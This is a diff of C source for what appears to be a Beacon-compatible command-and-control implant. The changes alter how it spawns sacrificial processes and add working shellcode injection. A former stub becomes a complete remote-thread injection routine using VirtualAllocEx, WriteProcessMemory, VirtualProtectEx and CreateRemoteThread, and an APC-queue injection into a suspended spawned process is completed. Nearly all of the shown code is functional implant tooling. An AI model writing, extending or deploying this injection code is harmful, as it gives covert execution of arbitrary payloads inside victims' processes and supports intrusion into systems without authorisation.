@@ -351,60 +351,6 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
 }
 
 
-// BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo)
-// {
-// 	SECURITY_ATTRIBUTES saAttr = { 0 };
-// 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-// 	saAttr.bInheritHandle = TRUE;
-// 	saAttr.lpSecurityDescriptor = NULL;
-
-// 	HANDLE hStdOutRead;
-// 	HANDLE hStdOutWrite;
-
-// 	/* Create an anonymous pipe */
-// 	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
-// 		_dbg("Failed to create anonymous pipe .\n");
-// 		return FALSE;
-// 	}
-
-// 	/* Prevent child from inheriting the read handle */
-// 	SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
-
-// 	/* Set up STARTUPINFO for output redirection */
-// 	sInfo->hStdOutput = hStdOutWrite;
-// 	sInfo->hStdError = hStdOutWrite;
-// 	sInfo->dwFlags |= STARTF_USESTDHANDLES;
-
-// 	/* Create full path of target process */
-//     CHAR lpPath   [MAX_PATH * 2];
-//     if (x86) {
-//         sprintf(lpPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
-//     }
-//     else {
-//         sprintf(lpPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
-//     }
-
-//     BOOL bSuccess = FALSE;
-
-//     bSuccess = CreateProcessA(
-//         NULL, 
-//         lpPath, 
-//         NULL, 
-//         NULL, 
-//         TRUE, 
-//         CREATE_SUSPENDED | CREATE_NO_WINDOW, 
-//         NULL, 
-//         NULL, 
-//         sInfo, 
-//         pInfo
-//     );
-
-// 	/* Close the write handle in the parent (no longer needed) */
-// 	CloseHandle(hStdOutWrite);
-
-//     return bSuccess;
-// }
-
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
     BOOL bSuccess = FALSE;
     CHAR lpPath   [MAX_PATH * 2];
@@ -438,7 +384,7 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
             siw.hStdOutput = sInfo->hStdOutput;
             siw.hStdError = sInfo->hStdError;
             siw.hStdInput = sInfo->hStdInput;
-            siw.dwFlags |= STARTF_USESTDHANDLES;
+            // siw.dwFlags |= STARTF_USESTDHANDLES;
         }
         
         bSuccess = CreateProcessWithTokenW(
@@ -459,7 +405,7 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
             lpPath, 
             NULL, 
             NULL, 
-            TRUE, 
+            FALSE,                              // Inherit Handles
             CREATE_SUSPENDED | CREATE_NO_WINDOW, 
             NULL, 
             NULL, 
@@ -471,15 +417,57 @@ BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo,
     return bSuccess;
 }
 
+
 void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* Leaving this to be implemented by people needing/wanting it */
+    /* Basic explicit process injection (CreateRemoteThread) */
+    LPVOID remoteBuf = NULL;
+    HANDLE hThread   = NULL;
+    DWORD  oldProt   = 0;
+
+    if (!hProc || !payload || p_len <= 0) {
+        return;
+    }
+
+    /* Allocate memory in the remote process */
+    remoteBuf = VirtualAllocEx(hProc, NULL, p_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+    if (!remoteBuf) {
+        return;
+    }
+
+    /* Write payload to remote process */
+    if (!WriteProcessMemory(hProc, remoteBuf, payload, p_len, NULL)) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        return;
+    }
+
+    /* Make payload executable */
+    if (!VirtualProtectEx(hProc, remoteBuf, p_len, PAGE_EXECUTE_READ, &oldProt)) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        return;
+    }
+
+    /* Execute payload */
+    hThread = CreateRemoteThread(
+        hProc,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)((BYTE*)remoteBuf + p_offset),
+        NULL,
+        0,
+        NULL
+    );
+
+    if (hThread) {
+        CloseHandle(hThread);
+    }
+
     return;
 }
 
+// Placeholder injection technique for Beacon API
 void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
-    /* The most basic injection as a placeholder */
-    
-    /* Commented out for detection purposes */
+    /* Basic spawn process injection (QueueUserAPC) */
     HANDLE hProc                    = pInfo->hProcess;
     HANDLE hThread                  = pInfo->hThread;
     PVOID pAddress                  = NULL;
@@ -506,6 +494,7 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 		return;
 	}
 
+    // Queue APC in existing thread
     if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
 		_dbg("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return;
@@ -513,6 +502,10 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
 
     // Execute shellcode
     ResumeThread(hThread);
+
+    if (hThread) {
+        CloseHandle(hThread);
+    }
 
     return;
 }
